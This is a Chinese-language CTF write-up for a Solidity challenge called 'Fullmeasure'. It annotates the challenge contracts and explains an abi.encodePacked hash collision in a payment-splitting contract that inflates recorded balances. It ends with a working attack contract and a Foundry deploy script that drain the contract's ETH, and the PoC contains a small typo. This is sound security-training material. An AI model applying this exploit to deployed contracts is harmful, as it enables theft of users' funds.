# Fullmeasure

# 源码

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.9;

import "./need/IERC721.sol";
import "./Split.sol";

//0x335c9E0B2fA89002bDAA2214AA2292d739a64763
//v4.local.S4lKoFHtJnMIxaMNjvsOcFzKfbFNzkcubUxMsjmfS9FGsce3T7OoNZjUrCuaO_X_MrQ66YrTcq9JYt9avMNnNjWC554G4MWHZ1E1lp-Rf6dpopCDPFQJgcHj4mPZgK6Uoh2oNmchBrMJ1UuL_Dv4IHN-kO5a7QekcdmnulhYAJh_Gg.U2V0dXA
contract Setup {
    Split public  split;
    //0xA7A1AD9cdef804c64512272a1daba0b2B3683F45
   
    constructor( ) payable {
         split = new Split();

        address[] memory addrs = new address[](2);
        addrs[0] = address(0x000000000000000000000000000000000000dEaD);
        addrs[1] = address(0x000000000000000000000000000000000000bEEF);
        uint32[] memory percents = new uint32[](2);
        percents[0] = 5e5;
        percents[1] = 5e5;

        uint256 id = split.createSplit(addrs, percents, 0);

        Split.SplitData memory splitData = split.splitsById(id);
        splitData.wallet.deposit{value: 10 ether}();

      
    }
  

    function isSolved() external view returns (bool) {
        Split.SplitData memory splitData = split.splitsById(0);

        return address(split).balance == 0 && address(splitData.wallet).balance == 0;
    }
}

```

```solidity
// SPDX-License-Identifier: MIT 
pragma solidity 0.8.9;
import "./need/IERC20.sol";
import "./need/ERC721.sol";
import "./need/ClonesWithImmutableArgs.sol";
import "./SplitWallet.sol";


contract Split is ERC721("Split", "SPLIT") { // 可拆分钱包
    using ClonesWithImmutableArgs for address;

    struct SplitData {
        bytes32 hash;
        SplitWallet wallet;
    }

    SplitWallet private immutable IMPLEMENTATION = new SplitWallet();
    uint256 private immutable SCALE = 1e6;

    uint256 public nextId;

    mapping(uint256 => SplitData) private _splitsById;

    mapping(address => mapping(address => uint256)) public balances;

    modifier onlySplitOwner(uint256 splitId) {
        _onlySplitOwner(splitId);
        _;
    }

    function _onlySplitOwner(uint256 splitId) private view {
        require(msg.sender == ownerOf(splitId), "NOT_SPLIT_OWNER");
    }

    modifier validSplit(address[] memory accounts, uint32[] memory percents, uint32 relayerFee) {
        _validSplit(accounts, percents, relayerFee);
        _;
    }

    function _validSplit(address[] memory accounts, uint32[] memory percents, uint32 relayerFee) private pure {
        require(accounts.length == percents.length, "MISMATCH_LENGTH");//length相同

        uint256 sum;
        for (uint256 i = 0; i < accounts.length; i++) {
            sum += percents[i];
        }

        require(sum == SCALE, "INVALID_PERCENTAGES");//i到count总和==1e6

        require(relayerFee < SCALE / 10, "INVALID_RELAYER_FEE");//relayerFee< 1e6/10
    }

    function createSplit(address[] memory accounts, uint32[] memory percents, uint32 relayerFee)
        external
        returns (uint256)
    {
        return _createSplit(accounts, percents, relayerFee, msg.sender);
    }

    function createSplitFor(address[] memory accounts, uint32[] memory percents, uint32 relayerFee, address owner)
        external
        returns (uint256)
    {
        return _createSplit(accounts, percents, relayerFee, owner);
    }

    function _createSplit(address[] memory accounts, uint32[] memory percents, uint32 relayerFee, address owner)
        private
        validSplit(accounts, percents, relayerFee)
        returns (uint256)
    {
        uint256 tokenId = nextId++;

        address wallet = address(IMPLEMENTATION).clone(abi.encodePacked(address(this)));

        _splitsById[tokenId] =
            SplitData({hash: _hashSplit(accounts, percents, relayerFee), wallet: SplitWallet(payable(wallet))});

        _mint(owner, tokenId);

        return tokenId;
    }

    function updateSplit(uint256 splitId, address[] memory accounts, uint32[] memory percents, uint32 relayerFee)
        external
    {
        _updateSplit(splitId, accounts, percents, relayerFee);
    }

    function updateSplitAndDistribute(
        uint256 splitId,
        address[] memory accounts,
        uint32[] memory percents,
        uint32 relayerFee,
        IERC20 token
    ) external {
        _updateSplit(splitId, accounts, percents, relayerFee);
        _distribute(splitId, accounts, percents, relayerFee, token);
    }

    function distribute(
        uint256 splitId,
        address[] memory accounts,
        uint32[] memory percents,
        uint32 relayerFee,
        IERC20 token
    ) external {
        _distribute(splitId, accounts, percents, relayerFee, token);
    }

    function withdraw(IERC20[] calldata tokens, uint256[] calldata amounts) external { // 未对调用者进行检查
        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20 token = tokens[i];
            uint256 amount = amounts[i];

            balances[msg.sender][address(token)] -= amount;

            if (address(token) == address(0x00)) {
                payable(msg.sender).transfer(amount);
            } else {
                token.transfer(msg.sender, amount);
            }
        }
    }

    function _updateSplit(uint256 splitId, address[] memory accounts, uint32[] memory percents, uint32 relayerFee)
        private
        onlySplitOwner(splitId)
        validSplit(accounts, percents, relayerFee)
    {
        _splitsById[splitId].hash = _hashSplit(accounts, percents, relayerFee);
    }

    function _distribute(
        uint256 splitId,
        address[] memory accounts,
        uint32[] memory percents,
        uint32 relayerFee,
        IERC20 token
    ) private {
        // 限制，对身份进行校验 -> _hashSplit使用的是abi.encodePacket (hash collision)
        // 没对数组长度进行校验，可以利用
        require(_splitsById[splitId].hash == _hashSplit(accounts, percents, relayerFee)); 

        SplitWallet wallet = _splitsById[splitId].wallet;
        uint256 storedWalletBalance = balances[address(wallet)][address(token)]; // 一般都为0
        uint256 externalWalletBalance = wallet.balanceOf(token); // 关注

        uint256 totalBalance = storedWalletBalance + externalWalletBalance;

        if (msg.sender != ownerOf(splitId)) {
            uint256 relayerAmount = totalBalance * relayerFee / SCALE; // relayerFee为0，不考虑
            balances[msg.sender][address(token)] += relayerAmount;
            totalBalance -= relayerAmount;
        }

        for (uint256 i = 0; i < accounts.length; i++) {
            balances[accounts[i]][address(token)] += totalBalance * percents[i] / SCALE; // 做高percent
        }

        if (storedWalletBalance > 0) {
            balances[address(wallet)][address(token)] = 0;
        }

        if (externalWalletBalance > 0) {
            wallet.pullToken(token, externalWalletBalance);
        }
    }

    function _hashSplit(address[] memory accounts, uint32[] memory percents, uint32 relayerFee)
        internal
        pure
        returns (bytes32)
    {
        // 将给定参数根据其所需最低空间编码，会把其中填充的很多 0 省略
        return keccak256(abi.encodePacked(accounts, percents, relayerFee));

    }

    function splitsById(uint256 id) external view returns (SplitData memory) {
        return _splitsById[id];
    }

    receive() external payable {}
}

```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

//0x527Eb022ae8aB3e68041f6084984026a0dF54aDf
import "./need/Clone.sol";
import "./need/IERC20.sol";

contract SplitWallet is Clone {
    function deposit() external payable {}

    function pullToken(IERC20 token, uint256 amount) external {
        require(msg.sender == _getArgAddress(0));

        if (address(token) == address(0x00)) {
            payable(msg.sender).transfer(amount);
        } else {
            token.transfer(msg.sender, amount);
        }
    }

    function balanceOf(IERC20 token) external view returns (uint256) {
        if (address(token) == address(0x00)) {
            return address(this).balance;
        }

        return token.balanceOf(address(this));
    }
}

```

# 思路

先看`issolved()`,要求split和wallet0的余额都==0

```solidity
Split.SplitData memory splitData = split.splitsById(0);
return address(split).balance == 0 && address(splitData.wallet).balance == 0;
```

然后看setu初始都给了什么:

一开始,是create了一个split0,并且往wallet0里存了10 ether

* wallet.balance = 10 ETH
* split.balance = 0

重点看split合约,其中我注意到了几个重要函数:

## create

```solidity
 function createSplit(address[] memory accounts, uint32[] memory percents, uint32 relayerFee)
        external
        returns (uint256)
    {
        return _createSplit(accounts, percents, relayerFee, msg.sender);
    }

    function createSplitFor(address[] memory accounts, uint32[] memory percents, uint32 relayerFee, address owner)
        external
        returns (uint256)
    {
        return _createSplit(accounts, percents, relayerFee, owner);
    }

    function _createSplit(address[] memory accounts, uint32[] memory percents, uint32 relayerFee, address owner)
        private
        validSplit(accounts, percents, relayerFee)
        returns (uint256)
    {
        uint256 tokenId = nextId++;

        address wallet = address(IMPLEMENTATION).clone(abi.encodePacked(address(this)));

        _splitsById[tokenId] =
            SplitData({hash: _hashSplit(accounts, percents, relayerFee), wallet: SplitWallet(payable(wallet))});

        _mint(owner, tokenId);

        return tokenId;
    }
```

这个可以让我们自己create新的split和wallet

## distribute

```solidity
function distribute(
        uint256 splitId,
        address[] memory accounts,
        uint32[] memory percents,
        uint32 relayerFee,
        IERC20 token
    ) external {
        _distribute(splitId, accounts, percents, relayerFee, token);
    }

  function _distribute(
        uint256 splitId,
        address[] memory accounts,
        uint32[] memory percents,
        uint32 relayerFee,
        IERC20 token
    ) private {
        // 限制，对身份进行校验 -> _hashSplit使用的是abi.encodePacket (hash collision)
        // 没对数组长度进行校验，可以利用
        require(_splitsById[splitId].hash == _hashSplit(accounts, percents, relayerFee)); 

        SplitWallet wallet = _splitsById[splitId].wallet;
        uint256 storedWalletBalance = balances[address(wallet)][address(token)]; // 一般都为0
        uint256 externalWalletBalance = wallet.balanceOf(token); // 关注

        uint256 totalBalance = storedWalletBalance + externalWalletBalance;

        if (msg.sender != ownerOf(splitId)) {
            uint256 relayerAmount = totalBalance * relayerFee / SCALE; // relayerFee为0，不考虑
            balances[msg.sender][address(token)] += relayerAmount;
            totalBalance -= relayerAmount;
        }

        for (uint256 i = 0; i < accounts.length; i++) {
            balances[accounts[i]][address(token)] += totalBalance * percents[i] / SCALE; // 做高percent
        }

        if (storedWalletBalance > 0) {
            balances[address(wallet)][address(token)] = 0;
        }

        if (externalWalletBalance > 0) {
            wallet.pullToken(token, externalWalletBalance);
        }
    }

```

这里有个`_hashSplit()`函数,是**abi.encodePacked**打包方式,是一个可利用的漏洞点或者碰撞点

```solidity
 function _hashSplit(address[] memory accounts, uint32[] memory percents, uint32 relayerFee)
        internal
        pure
        returns (bytes32)
    {
        // 将给定参数根据其所需最低空间编码，会把其中填充的很多 0 省略
        return keccak256(abi.encodePacked(accounts, percents, relayerFee));

    }
```

然后distribute里也有关键的几个地方:

```solidity
 for (uint256 i = 0; i < accounts.length; i++) {
            balances[accounts[i]][address(token)] += totalBalance * percents[i] / SCALE; // 做高percent
        }
```

这里是关键,一般我们会进入到这个分支,而这里又可以增加balance

注意到计算方式是

```solidity
totalBalance * percents[i] / SCALE
```

SCALE是常数1e6,`totalBalance`在setup后非0,而这个percent是我们可以自己控制的

一个可以控制的数/常数,那么就可以<font style="background-color:#FBDFEF;">做高percent,</font>从而让balance记高

## withdraw

```solidity
function withdraw(IERC20[] calldata tokens, uint256[] calldata amounts) external { // 未对调用者进行检查
        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20 token = tokens[i];
            uint256 amount = amounts[i];

            balances[msg.sender][address(token)] -= amount;

            if (address(token) == address(0x00)) {
                payable(msg.sender).transfer(amount);
            } else {
                token.transfer(msg.sender, amount);
            }
        }
    }
```

未对调用者进行检查,只需要调用者有balance,有多少balance就允许提走多少

`issolved()`里的split是所有split的余额,那么我们可以尝试利用新split和encodePacked的哈希碰撞,让我们的账户记到balance,然后再withdraw提走split的钱

***

综上可以摸索出一条路

1. 先把wallet0的钱distribute提到split0里
2. create一个split1
3. 往wallet1里存0.01 ether
4. split1去distribute,这里就可以通过encodePacked把我们自己的账户编进去,从而达到自己账户得到balance的目的
5. withdraw出split的balance

## 走不通的思路

首先就是改变split所有权，这里会有个函数

```solidity
function _updateSplit(uint256 splitId, address[] memory accounts, uint32[] memory percents, uint32 relayerFee)
        private
        onlySplitOwner(splitId)
        validSplit(accounts, percents, relayerFee)
    {
        _splitsById[splitId].hash = _hashSplit(accounts, percents, relayerFee);
    }
```

可以改变split所有权，我本来想尝试能不能拿到部署账户的私钥，或者也是哈希碰撞一下，后来发现不行

# poc

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Setup} from "./Setup.sol";
import {Split} from "./Split.sol";
import {SplitWallet} from "./SplitWallet.sol";
import {IERC20} from "./need/IERC20.sol";

contract Attack {
    Setup public setup;
    Split public split;
    uint256 public split1;
    uint256 public split2;
    SplitWallet public wallet;
    uint32 public relayerFee = 0;

    constructor(address addr) {
        L setup = Setup(addr);
        split = setup.split();
    }

    function attack() external payable {
        //把 10 ether从wallet0提到split0
        uint32[] memory percents1 = new uint32[](4);
        percents1[0] = 0xDEAD;
        percents1[1] = 0xBEEF;
        percents1[2] = 500000;
        percents1[3] = 500000;
        address[] memory account1 = new address[](0); //空的
        IERC20 token = IERC20(address(0));
        split.distribute(0, account1, percents1, relayerFee, token);

        // //创split1 1+1
        // address[] memory account2 = new address[](1);
        // account2[0] = 0x98707a8Cb53bD823f9c5353611018aF38533adE5;
        // uint32[] memory percents2 = new uint32[](1);
        // percents2[0] = 1e6;
        // split1 = split.createSplit(account2, percents2, relayerFee);
        // //Split.SplitData memory a=split.splitsById(split1);
        // //address wallet1=address(a.wallet);

        //创split2 2+2
        address[] memory account3 = new address[](2);
        account3[0] = address(this); //攻击合约
        account3[1] = 0x00000000000000000000000000000000FFFFfFFF;
        uint32[] memory percents3 = new uint32[](2);
        percents3[0] = 500000;
        percents3[1] = 500000;
        split2 = split.createSplit(account3, percents3, relayerFee);

        //wallet2 deposit
        Split.SplitData memory b = split.splitsById(split2);
        address wallet2 = address(b.wallet);
        SplitWallet(payable(wallet2)).deposit{value: 0.01 ether}();

        //split2 distribute 3+1
        uint32[] memory percents4 = new uint32[](3);
        percents4[0] = 0xFFFFFFFF;
        percents4[1] = 500000;
        percents4[2] = 500000;
        address[] memory account4 = new address[](1);
        account4[0] = address(this); //攻击合约
        split.distribute(split2, account4, percents4, 0, IERC20(address(0)));

        require(split.balances(address(this), address(0)) >= 10 ether, "balance not enough");

        //withdraw
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = address(split).balance;
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(address(0));
        split.withdraw(tokens, amounts); //以攻击合约视角

        require(setup.isSolved(), "no!!!!!!!!"); 
    }

    receive() external payable {}
}


```

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import {Attack} from "../contracts/1.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Attack attack = new Attack(0x335c9E0B2fA89002bDAA2214AA2292d739a64763);
        attack.attack{value: 2 ether}();
        // uint256[] memory amounts=new uint256[](1);
        // amounts[0]=address(split).balance;
        // IERC20[] memory tokens=new IERC20[](1);
        // tokens[0]=IERC20(address(0));
        // split.withdraw(tokens,amounts);
        vm.stopBroadcast();
    }
}

```


> 更新: 2026-03-08 23:19:54  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/qgvtrm7pled2mgwg>